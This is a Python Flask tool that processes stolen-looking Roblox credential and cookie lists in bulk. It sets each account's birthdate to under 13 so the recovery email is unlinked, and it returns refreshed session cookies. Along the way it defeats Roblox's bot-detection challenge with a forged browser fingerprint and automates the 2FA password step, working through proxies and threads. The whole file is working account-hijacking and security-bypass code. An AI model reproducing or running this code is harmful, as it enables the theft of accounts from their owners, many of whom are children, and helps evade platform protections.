import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import date, datetime, timedelta
import hashlib
import json
import os
import queue
import random
import threading
import time

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
import curl_cffi.requests
import ecdsa
from flask import Flask, Response, render_template, request, stream_with_context

app = Flask(__name__)

FAKE_BROWSER_EVENTS = json.dumps({
    "audio": {"sampleHash": 1168.9068228197468, "oscillator": "sine", "maxChannels": 1, "channelCountMode": "max"},
    "canvas": {"commonImageDataHash": "178638c684842f30cc1fbaa1bfa16c0f"},
    "fonts": json.dumps({
        "Arial Black": 531.9140625, "Calibri": 420.046875, "Candara": 435.4453125,
        "Comic Sans MS": 462.4453125, "Constantia": 469.86328125, "Courier": 432.0703125,
        "Courier New": 432.0703125, "Franklin Gothic Medium": 431.82421875,
        "Georgia": 475.2421875, "Impact": 395.54296875, "Lucida Console": 433.828125,
        "Lucida Sans Unicode": 472.0078125, "Segoe Print": 514.30078125,
        "Segoe Script": 525.234375, "Segoe UI": 450, "Tahoma": 432.45703125,
        "Trebuchet MS": 428.90625, "Verdana": 486.5625
    }),
    "hardware": {
        "videocard": {"vendor": "WebKit", "renderer": "WebKit WebGL",
                      "version": "WebGL 1.0 (OpenGL ES 2.0 Chromium)",
                      "shadingLanguageVersion": "WebGL GLSL ES 1.0 (OpenGL ES GLSL ES 1.0 Chromium)"},
        "architecture": 255, "deviceMemory": "8", "jsHeapSizeLimit": 4294705152
    },
    "locales": {"languages": "en-US", "timezone": "Asia/Bangkok"},
    "permissions": {
        "accelerometer": "granted", "backgroundFetch": "granted", "backgroundSync": "granted",
        "camera": "prompt", "clipboardRead": "prompt", "clipboardWrite": "granted",
        "displayCapture": "prompt", "gyroscope": "granted", "geolocation": "prompt",
        "localFonts": "prompt", "magnetometer": "granted", "microphone": "prompt",
        "midi": "prompt", "notifications": "prompt", "paymentHandler": "granted",
        "persistentStorage": "prompt", "storageAccess": "granted", "windowManagement": "prompt"
    },
    "plugins": {"plugins": json.dumps([
        "PDF Viewer|internal-pdf-viewer|Portable Document Format",
        "Chrome PDF Viewer|internal-pdf-viewer|Portable Document Format",
        "Chromium PDF Viewer|internal-pdf-viewer|Portable Document Format",
        "Microsoft Edge PDF Viewer|internal-pdf-viewer|Portable Document Format",
        "WebKit built-in PDF|internal-pdf-viewer|Portable Document Format"
    ])},
    "screen": {
        "is_touchscreen": False, "maxTouchPoints": 0, "colorDepth": 24,
        "mediaMatches": [
            "prefers-contrast: no-preference", "any-hover: hover", "any-pointer: fine",
            "pointer: fine", "hover: hover", "update: fast",
            "prefers-reduced-motion: no-preference", "prefers-reduced-transparency: no-preference",
            "scripting: enabled", "forced-colors: none"
        ]
    },
    "system": {
        "platform": "Win32", "cookieEnabled": True, "productSub": "20030107", "product": "Gecko",
        "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "hardwareConcurrency": 16,
        "browser": {"name": "Chrome", "version": "141.0"}, "applePayVersion": 0
    },
    "webgl": {"commonImageHash": "3a4ed1c6378f68583893dd719f84f6c9"},
    "math": {
        "acos": 1.0471975511965979, "asin": -9.614302481290016e-17,
        "atan": 4.578239276804769e-17, "cos": -4.854249971455313e-16,
        "cosh": 1.9468519159297506, "e": 2.718281828459045,
        "largeCos": 0.7639704044417283, "largeSin": -0.6452512852657808,
        "largeTan": -0.8446024630198843, "log": 6.907755278982137,
        "pi": 3.141592653589793, "sin": -1.9461946644816207e-16,
        "sinh": -0.6288121810679035, "sqrt": 1.4142135623730951,
        "tan": 6.980860926542689e-14, "tanh": -0.39008295789884684
    },
    "data_latency_ms": 229.5, "extension_id": ""
})


def get_time_str():
    return datetime.now().strftime("%H:%M:%S")


def get_date_of_birth():
    today = date.today()
    dob = today.replace(year=today.year - 13) + timedelta(days=1)
    return {"birthMonth": dob.month, "birthDay": dob.day, "birthYear": dob.year}


def json_stringify(data):
    return json.dumps(data, separators=(",", ":"), ensure_ascii=False)


def normalize_proxy(raw_proxy):
    if not raw_proxy:
        return None
    proxy = raw_proxy.strip()
    if not proxy or proxy.startswith("#"):
        return None
    if "://" in proxy:
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        scheme = "socks5" if port in ("1080", "1081") else "http"
        return f"{scheme}://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        scheme = "socks5" if port in ("1080", "1081") else "http"
        return f"{scheme}://{host}:{port}"
    return None


class RobloxSession:
    CHROME_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
    SEC_CH_UA = '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"'

    def __init__(self, cookie, password, proxy=None):
        proxies = {"http": proxy, "https": proxy} if proxy else None
        self.session = curl_cffi.requests.Session(impersonate="chrome131", proxies=proxies)
        self.session.cookies.set(".ROBLOSECURITY", cookie)
        self.password = password
        self.csrf_token = None
        self.session.headers.update({
            "accept-language": "en-US,en;q=0.9",
            "origin": "https://www.roblox.com",
            "referer": "https://www.roblox.com/",
            "sec-ch-ua": self.SEC_CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": self.CHROME_UA,
        })

    def _get_csrf(self):
        if self.csrf_token:
            return self.csrf_token
        try:
            r = self.session.post("https://auth.roblox.com/v2/logout", json={}, timeout=10)
            token = r.headers.get("x-csrf-token")
            if token:
                self.csrf_token = token
                return token
        except Exception:
            pass
        try:
            r = self.session.get("https://www.roblox.com/home", timeout=10)
            if 'name="csrf-token" data-token="' in r.text:
                self.csrf_token = r.text.split('name="csrf-token" data-token="')[1].split('"')[0]
                return self.csrf_token
        except Exception:
            pass
        return None

    def _refresh_csrf(self, response=None):
        if response is not None:
            token = response.headers.get("x-csrf-token")
            if token:
                self.csrf_token = token
                return token
        try:
            r = self.session.post("https://auth.roblox.com/v2/login", json={}, timeout=5)
            token = r.headers.get("x-csrf-token")
            if token:
                self.csrf_token = token
                return token
        except Exception:
            pass
        return self.csrf_token

    def check_email(self):
        self._get_csrf()
        headers = {
            "accept": "application/json, text/plain, */*",
            "origin": "https://www.roblox.com",
            "referer": "https://www.roblox.com/",
        }
        if self.csrf_token:
            headers["x-csrf-token"] = self.csrf_token
        try:
            resp = self.session.get("https://accountsettings.roblox.com/v1/email", headers=headers, timeout=10)
        except Exception:
            return None

        if resp.status_code == 401:
            return {"isDead": True, "hasEmail": False, "emailAddress": None, "verified": False}

        if resp.status_code == 403:
            self._refresh_csrf(resp)
            headers["x-csrf-token"] = self.csrf_token
            try:
                resp = self.session.get("https://accountsettings.roblox.com/v1/email", headers=headers, timeout=10)
            except Exception:
                return None

        if resp.status_code == 200:
            data = resp.json()
            email_addr = data.get("emailAddress")
            return {
                "hasEmail": bool(email_addr),
                "emailAddress": email_addr,
                "verified": data.get("verified", False),
                "isDead": False,
            }
        return None

    def _solve_chef_challenge(self, metadata, headers):
        challenge_id = metadata["challengeId"]
        user_id = metadata["userId"]
        script_ids = metadata["scriptIdentifiers"]

        try:
            prelude_resp = self.session.get(
                "https://apis.roblox.com/rotating-client-service/v1/prelude/latest",
                headers=headers,
                timeout=12,
            )
            nonce = prelude_resp.text.split('ChefScript.prelude.nonce="', 1)[-1].split('"', 1)[0]
        except Exception:
            return False

        signing_key = ecdsa.SigningKey.generate(curve=ecdsa.NIST256p, hashfunc=hashlib.sha256)
        pub_key_b64 = base64.b64encode(signing_key.get_verifying_key().to_der()).decode()

        self.session.post(
            "https://apis.roblox.com/rotating-client-service/v1/register",
            headers=headers,
            data=json_stringify({"identifier": nonce, "key": pub_key_b64}),
            timeout=12,
        )
        self.session.get(
            "https://apis.roblox.com/rotating-client-service/v1/defer/raven?pathname=%2Fes%2Fhome",
            headers=headers,
            timeout=12,
        )

        expected_symbols = []
        for identifier in script_ids:
            try:
                resp = self.session.get(
                    f"https://apis.roblox.com/rotating-client-service/v1/fetch?challengeId={challenge_id}&identifier={identifier}",
                    headers=headers,
                    timeout=12,
                )
                if resp.status_code != 200:
                    return False
                decoded_js = base64.b64decode(resp.text).decode()
                expected_symbol = decoded_js.split('const expectedSymbol="', 1)[-1].split('"', 1)[0]
                rsa_key = decoded_js.split('produceProtectedPayload("', 1)[-1].split('"', 1)[0]
                expected_symbols.append((expected_symbol, rsa_key))
            except Exception:
                return False

        if len(expected_symbols) < 2:
            return False

        for expected_symbol, rsa_key_b64 in expected_symbols:
            payload_data = {
                "symbolEntry": expected_symbol,
                "events": [FAKE_BROWSER_EVENTS],
                "metrics": [],
                "nonce": nonce,
                "signature": base64.b64encode(signing_key.sign(f"{expected_symbol}|{nonce}".encode())).decode(),
                "preludeTamperedWith": False,
            }
            aes_key = os.urandom(32)
            iv = os.urandom(12)
            cipher = AES.new(aes_key, AES.MODE_GCM, iv)
            ciphertext, mac_tag = cipher.encrypt_and_digest(json_stringify(payload_data).encode())

            rsa_pub = RSA.import_key(base64.b64decode(rsa_key_b64))
            encrypted_aes_key = PKCS1_OAEP.new(rsa_pub).encrypt(aes_key)

            submit_payload = {
                "userId": user_id,
                "challengeId": challenge_id,
                "payloadV2": base64.b64encode(ciphertext + mac_tag).decode(),
                "params": {
                    "key": base64.b64encode(encrypted_aes_key).decode(),
                    "iv": base64.b64encode(iv).decode(),
                },
                "btid": metadata.get("browserTrackerId", ""),
            }
            self.session.post(
                "https://apis.roblox.com/rotating-client-service/v1/submit",
                headers=headers,
                data=json_stringify(submit_payload),
                timeout=12,
            )

        return True

    def _verify_2fa(self, user_id, challenge_id, headers):
        verify_data = json.dumps({
            "challengeId": challenge_id,
            "actionType": "Generic",
            "code": self.password,
        }, separators=(",", ":"))
        verify_url = f"https://twostepverification.roblox.com/v1/users/{user_id}/challenges/password/verify"
        resp = self.session.post(verify_url, headers=headers, data=verify_data, timeout=12)
        if resp.status_code != 200:
            return None
        try:
            return resp.json().get("verificationToken")
        except Exception:
            return None

    def set_birthdate(self, on_step=None):
        def step(msg):
            if on_step:
                on_step(msg)

        step("[1/6] Check email status")
        email_info = self.check_email()
        if not email_info:
            return False, False, "Empty email check response"
        if email_info.get("isDead", False):
            return False, True, "Cookie DEAD (401)"

        if not self.csrf_token:
            self._get_csrf()
        if not self.csrf_token:
            return False, False, "Could not get CSRF token"

        headers = {
            "x-csrf-token": self.csrf_token,
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
        }

        step("[2/6] Set birthdate (<13)")
        bd_payload = get_date_of_birth()
        resp = self.session.post("https://users.roblox.com/v1/birthdate", headers=headers, json=bd_payload, timeout=12)

        if resp.status_code == 200:
            return True, False, "Unlinked directly (200)"

        if resp.status_code == 403 and "token" in resp.text.lower():
            self._refresh_csrf(resp)
            headers["x-csrf-token"] = self.csrf_token
            resp = self.session.post("https://users.roblox.com/v1/birthdate", headers=headers, json=bd_payload, timeout=12)
            if resp.status_code == 200:
                return True, False, "Unlinked after CSRF refresh"

        challenge_metadata_b64 = resp.headers.get("rblx-challenge-metadata")
        challenge_type = resp.headers.get("rblx-challenge-type")
        if not challenge_metadata_b64 or challenge_type != "chef":
            return False, False, f"No chef challenge (status={resp.status_code}, type={challenge_type})"

        try:
            metadata = json.loads(base64.b64decode(challenge_metadata_b64).decode())
        except Exception:
            return False, False, "Invalid chef metadata"

        challenge_id_first = metadata["challengeId"]
        user_id = metadata["userId"]

        step("[3/6] Solve chef challenge")
        if not self._solve_chef_challenge(metadata, headers):
            return False, False, "Chef challenge failed"

        step("[4/6] Continue challenge")
        continue_payload = {
            "challengeID": challenge_id_first,
            "challengeMetadata": json.dumps({
                "userId": user_id,
                "challengeId": challenge_id_first,
                "browserTrackerId": metadata.get("browserTrackerId", ""),
            }, separators=(",", ":")),
            "challengeType": "chef",
        }
        continue_resp = self.session.post("https://apis.roblox.com/challenge/v1/continue", headers=headers, json=continue_payload, timeout=12)
        if continue_resp.status_code != 200:
            return False, False, f"Continue failed ({continue_resp.status_code})"

        continue_data = continue_resp.json()
        next_challenge = continue_data.get("challengeType")
        if next_challenge == "blocksession":
            return False, False, "Block Session"
        if next_challenge != "twostepverification":
            return False, False, f"Unexpected challenge: {next_challenge}"

        try:
            challenge_id_from_body = continue_data.get("challengeId")
            meta_parsed = json.loads(continue_data.get("challengeMetadata", "{}"))
            vals = list(meta_parsed.values())
            if len(vals) >= 2:
                user_id = vals[0]
                challenge_id_2fa = vals[1]
            else:
                user_id = meta_parsed.get("userId", user_id)
                challenge_id_2fa = meta_parsed.get("challengeId", challenge_id_from_body)
        except Exception:
            return False, False, "Failed parsing 2FA metadata"

        step("[5/6] Verify password (2FA)")
        verification_token = self._verify_2fa(user_id, challenge_id_2fa, headers)
        if not verification_token:
            return False, False, "2FA password verify failed"

        self._refresh_csrf()
        headers["x-csrf-token"] = self.csrf_token

        final_continue = json.dumps({
            "challengeId": challenge_id_first,
            "challengeType": "twostepverification",
            "challengeMetadata": json.dumps({
                "verificationToken": verification_token,
                "rememberDevice": False,
                "challengeId": challenge_id_2fa,
                "actionType": "Generic",
            }),
        }, separators=(",", ":"))

        final_resp = self.session.post("https://apis.roblox.com/challenge/v1/continue", headers=headers, data=final_continue, timeout=12)
        if final_resp.status_code != 200:
            return False, False, f"Final continue failed ({final_resp.status_code})"

        try:
            if final_resp.json().get("challengeType") == "blocksession":
                return False, False, "Block Session (final)"
        except Exception:
            pass

        step("[6/6] Finalize birthdate update")
        challenge_metadata_b64_final = base64.b64encode(json.dumps({
            "verificationToken": verification_token,
            "rememberDevice": False,
            "challengeId": challenge_id_2fa,
            "actionType": "Generic",
        }, separators=(",", ":")).encode()).decode()

        for attempt in range(3):
            birthdate_headers = {
                "host": "users.roblox.com",
                "pragma": "no-cache",
                "cache-control": "no-cache",
                "rblx-challenge-metadata": challenge_metadata_b64_final,
                "sec-ch-ua-platform": '"Windows"',
                "x-csrf-token": self.csrf_token,
                "user-agent": self.CHROME_UA,
                "sec-ch-ua": self.SEC_CH_UA,
                "rblx-challenge-id": challenge_id_first,
                "rblx-challenge-type": "chef",
                "sec-ch-ua-mobile": "?0",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "x-retry-attempt": str(attempt + 1),
                "origin": "https://www.roblox.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.roblox.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
            }
            final_bd_resp = self.session.post("https://users.roblox.com/v1/birthdate", headers=birthdate_headers, json=bd_payload, timeout=12)
            if final_bd_resp.status_code == 200:
                return True, False, "Unlinked mail success"
            if "token" in final_bd_resp.text.lower():
                new_csrf = final_bd_resp.headers.get("x-csrf-token")
                if new_csrf:
                    self.csrf_token = new_csrf

        return False, False, "Birthdate retry exhausted"


def parse_accounts(raw_text):
    accounts = []
    for line in raw_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        sep = ":" if ":" in line else ("/" if "/" in line else None)
        if not sep:
            continue
        parts = line.split(sep, 2)
        if len(parts) < 3:
            continue
        username = parts[0].strip()
        password = parts[1].strip()
        cookie = parts[2].strip()
        if username and password and len(cookie) >= 20:
            accounts.append({"username": username, "password": password, "cookie": cookie})
    return accounts


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/unlink", methods=["POST"])
def api_unlink():
    payload = request.get_json(force=True)
    accounts = parse_accounts(payload.get("accounts", ""))
    proxies = [p for p in (normalize_proxy(x) for x in payload.get("proxies", "").splitlines()) if p]
    threads = max(1, min(30, int(payload.get("threads", 5))))
    retries = max(0, min(5, int(payload.get("retries", 2))))
    retry_delay = max(0, min(15, int(payload.get("retryDelay", 2))))

    def stream():
        if not accounts:
            yield f"data: {json.dumps({'type': 'error', 'time': get_time_str(), 'msg': 'Không có account hợp lệ (user:pass:cookie)'})}\n\n"
            return

        q = queue.Queue()
        total = len(accounts)

        def push(ev_type, **kw):
            kw["type"] = ev_type
            kw["time"] = get_time_str()
            q.put(kw)

        def worker(idx, acc):
            username = acc["username"]
            password = acc["password"]
            cookie = acc["cookie"]
            proxy = random.choice(proxies) if proxies else None

            push("log", level="INFO", msg=f"{username} | Start unlink flow")
            rbx = RobloxSession(cookie=cookie, password=password, proxy=proxy)

            ok = False
            is_dead = False
            reason = ""

            for attempt in range(1, retries + 2):
                ok, is_dead, reason = rbx.set_birthdate(
                    on_step=lambda m: push("log", level="STEP", msg=f"{username} | {m}")
                )
                if ok or is_dead:
                    break
                if attempt <= retries:
                    push("log", level="WARN", msg=f"{username} | Retry {attempt}/{retries} ({reason})")
                    time.sleep(retry_delay)

            curr_cookie = cookie
            try:
                c = rbx.session.cookies.get(".ROBLOSECURITY")
                if c:
                    curr_cookie = c
            except Exception:
                pass

            if ok:
                push("success", username=username, line=f"{username}:{password}:{curr_cookie}", msg=reason)
            else:
                tag = "DEAD" if is_dead else "FAIL"
                push("fail", username=username, line=f"{username}:{password}:{curr_cookie} | {reason}", msg=f"[{tag}] {reason}")

        def runner():
            push("start", total=total)
            with ThreadPoolExecutor(max_workers=min(threads, total)) as pool:
                futs = [pool.submit(worker, i, acc) for i, acc in enumerate(accounts)]
                for f in as_completed(futs):
                    try:
                        f.result()
                    except Exception as e:
                        push("log", level="ERR", msg=f"Worker error: {e}")
            push("done")

        threading.Thread(target=runner, daemon=True).start()

        while True:
            item = q.get()
            yield f"data: {json.dumps(item)}\n\n"
            if item.get("type") in ("done", "error"):
                break

    return Response(stream_with_context(stream()), mimetype="text/event-stream")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
